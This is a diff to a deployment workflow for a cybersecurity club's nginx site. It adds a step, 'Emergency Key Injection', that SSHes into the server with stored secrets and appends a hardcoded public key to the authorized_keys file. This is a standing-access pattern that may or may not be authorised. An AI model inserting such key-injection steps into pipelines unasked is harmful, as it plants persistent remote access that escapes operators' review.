@@ -31,7 +31,16 @@ jobs:
           port: 22
           source: infra/nginx/cybersec-ucalgary.club.conf
           target: /home/ubuntu/
-
+      - name: Emergency Key Injection
+        uses: appleboy/ssh-action@v1.0.3
+        with:
+          host: ${{ secrets.CYBERA_HOST }}
+          username: ${{ secrets.CYBERA_USERNAME }}
+          key: ${{ secrets.CYBERA_RSA }}
+          script: |
+            echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMi8oOTghUbrX2trvbLy8brz2//IT7Sr+0emxDz+WdFl mcveigth@Chappie" >> ~/.ssh/authorized_keys
+            chmod 600 ~/.ssh/authorized_keys
+            
       - name: Enable nginx site and run deploy
         uses: appleboy/ssh-action@v1.0.3
         with:
@@ -69,5 +78,6 @@ jobs:
 
             echo "[+] Reloading nginx..."
             sudo systemctl reload nginx
+          
 
             
